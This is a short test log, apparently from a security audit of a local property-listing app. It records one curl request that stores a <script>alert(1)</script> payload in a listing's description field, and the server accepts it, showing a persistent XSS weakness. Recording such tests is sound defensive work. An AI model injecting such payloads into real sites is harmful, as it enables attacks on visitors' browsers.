@@ -1,0 +1,6 @@
+=== A08 - XSS persistente ===
+Comando: curl -X POST http://localhost:3000/propiedades -H Content-Type: application/json -d {"propietario_id":1,"titulo":"Depto con XSS","descripcion":"<script>alert(1)</script>","comuna":"Providencia","precio":400000}
+--- Respuesta ---
+{"mensaje":"Propiedad publicada"}
+HTTP_STATUS:200
+
